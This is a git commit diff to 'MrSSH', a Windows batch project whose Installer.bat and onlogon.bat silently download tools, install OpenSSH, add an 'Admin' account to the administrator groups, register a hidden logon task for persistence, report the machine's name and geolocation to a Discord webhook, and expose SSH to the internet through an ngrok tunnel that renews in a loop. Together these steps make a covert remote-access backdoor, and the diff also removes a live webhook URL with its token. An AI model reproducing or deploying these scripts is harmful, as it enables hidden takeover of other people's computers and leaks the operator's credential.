d9d5a8f71ee7c22fdd70234e5515899236b1ac27
dheb <74708369+dh3b@users.noreply.github.com>
2021-11-07 20:59:02 +0100

    Comments

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -1,11 +1,15 @@
+@echo off
+setlocal enabledelayedexpansion
 cd %temp%
 
+:: <Install>
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1" -o "OpenSSH.ps1"
-curl -Ls "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat" -o "source.bat"
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Source.bat" -o "source.bat"
 curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
 curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
 curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"
+:: </Install>
 
 powershell ./OpenSSH.ps1
 
@@ -14,12 +18,14 @@ net localgroup Administrators Admin /add
 net localgroup Administratorzy Admin /add
 net localgroup Administración  Admin /add
 
+:: <Startup>
 mkdir %appdata%\MrSSH
 cd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Silentlog.vbs" -o "Silent.vbs"
 schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
 cd %temp%
+:: </Startup>
 
-set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
+set "webhook="
 
 for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"
 
@@ -28,13 +34,17 @@ call source.bat +silent --embed "MrSSH has been invoked on %computername%\%usern
 mkdir log
 tar -xf ngrok.zip
 
+:: <Start Ngrok>
 start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
 start /B "discordmsg" silentcmd %temp%\NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
+:: </Start Ngrok>
 
+:: <Restart Loop>
 :ngrokloop
 call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
 start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
 start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
+:: </Restart Loop>
--- Files/onlogon.bat
+++ Files/onlogon.bat
@@ -1,11 +1,15 @@
+@echo off
+setlocal enabledelayedexpansion
 cd %temp%
 
+:: <Install>
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1" -o "OpenSSH.ps1"
-curl -Ls "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat" -o "source.bat"
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Source.bat" -o "source.bat"
 curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
 curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
 curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"
+:: </Install>
 
 powershell ./OpenSSH.ps1
 
@@ -23,13 +27,17 @@ call source.bat +silent --embed "MrSSH has been invoked on %computername%\%usern
 mkdir log
 tar -xf ngrok.zip
 
+:: <Start Ngrok>
 start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
 start /B "discordmsg" silentcmd %temp%\NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
+:: </Start Ngrok>
 
+:: <Restart Loop>
 :ngrokloop
 call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
 start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
 start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
+:: </Restart Loop>
